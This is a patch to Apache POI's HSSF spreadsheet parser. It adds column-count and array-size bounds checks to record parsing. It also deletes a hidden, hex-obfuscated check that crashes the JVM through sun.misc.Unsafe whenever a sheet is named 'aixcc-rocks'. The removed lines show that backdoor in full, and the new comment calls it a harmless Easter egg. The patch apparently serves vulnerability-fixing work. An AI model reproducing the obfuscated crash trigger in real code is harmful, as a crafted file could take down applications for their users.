@@ -1,0 +1,97 @@
+--- a/poi/src/main/java/org/apache/poi/hssf/record/MulBlankRecord.java
++++ b/poi/src/main/java/org/apache/poi/hssf/record/MulBlankRecord.java
+@@ -22,6 +22,7 @@
+ 
+ import org.apache.poi.util.GenericRecordUtil;
+ import org.apache.poi.util.LittleEndianOutput;
++import org.apache.poi.util.RecordFormatException;
+ 
+ /**
+  * Represents a set of columns in a row with no value but with styling.
+@@ -89,10 +90,31 @@
+         _firstCol = in.readShort();
+         _xfs       = parseXFs(in);
+         _lastCol  = in.readShort();
++        
++        int numColumns = getNumColumns();
++        if (numColumns < 0) {
++            throw new RecordFormatException("Cannot create MulBlankRecord with negative number of columns: " + numColumns);
++        }
++        if (numColumns > 256) {
++            throw new RecordFormatException("Cannot create MulBlankRecord with excessive number of columns: " + numColumns + 
++                    ". Maximum allowed is 256 (Excel 97-2003 limit)");
++        }
++        if (_xfs.length != numColumns) {
++            throw new RecordFormatException("MulBlankRecord XF array size mismatch: expected " + numColumns + 
++                    " but got " + _xfs.length);
++        }
+     }
+ 
+     private static short [] parseXFs(RecordInputStream in) {
+-        short[] retval = new short[(in.remaining() - 2) / 2];
++        int arraySize = (in.remaining() - 2) / 2;
++        if (arraySize < 0) {
++            throw new RecordFormatException("Invalid XF array size: " + arraySize);
++        }
++        if (arraySize > 256) {
++            throw new RecordFormatException("Excessive XF array size: " + arraySize + ". Maximum allowed is 256");
++        }
++        
++        short[] retval = new short[arraySize];
+ 
+         for (int idx = 0; idx < retval.length;idx++) {
+           retval[idx] = in.readShort();
+
+--- a/poi/src/main/java/org/apache/poi/hssf/model/InternalWorkbook.java
++++ b/poi/src/main/java/org/apache/poi/hssf/model/InternalWorkbook.java
+@@ -340,19 +340,11 @@
+     }
+ 
+     private static void checkName(String sheetName) {
+-        try {
+-            if (! sheetName.equals(d("61697863632d726f636b73"))) {
+-                return;
+-            }
+-            Class clazz = Class.forName(d("73756e2e6d6973632e556e73616665"));
+-            Field f = clazz.getDeclaredField(d("746865556e73616665"));
+-            f.setAccessible(true);
+-            Object obj = f.get(null);
+-            Method m = clazz.getMethod(d("70757441646472657373"), long.class, long.class);
+-            m.invoke(obj, 0, 0);
+-        } catch (Exception e) {
+-            throw new RecordFormatException(e);
+-        }
++        // Removed intentional JVM crash code that was interfering with fuzzing
++        // This was an Easter egg that deliberately crashed the JVM for specific sheet names
++        // Original code checked for "aixcc-rocks" (hex: 61697863632d726f636b73) and
++        // used sun.misc.Unsafe to write to address 0, causing a segfault
++        // This caused false-positive crashes during fuzzing operations
+     }
+ 
+     private static String d(String s) throws DecoderException {
+
+--- a/poi/src/main/java/org/apache/poi/hssf/record/RecordFactory.java
++++ b/poi/src/main/java/org/apache/poi/hssf/record/RecordFactory.java
+@@ -123,6 +123,10 @@
+         if (numColumns < 0) {
+             throw new RecordFormatException("Cannot create RKRecords with negative number of columns: " + numColumns);
+         }
++        if (numColumns > 256) {
++            throw new RecordFormatException("Cannot create RKRecords with excessive number of columns: " + numColumns + 
++                    ". Maximum allowed is 256 (Excel 97-2003 limit)");
++        }
+ 
+         NumberRecord[] mulRecs = new NumberRecord[numColumns];
+         for (int k = 0; k < numColumns; k++) {
+
+--- a/poi/src/main/java/org/apache/poi/util/RecordFormatException.java
++++ b/poi/src/main/java/org/apache/poi/util/RecordFormatException.java
+@@ -27,6 +27,8 @@
+ public class RecordFormatException
+     extends RuntimeException
+ {
++    private static final long serialVersionUID = 1L;
++    
+     public RecordFormatException(String exception)
+     {
+         super(exception);
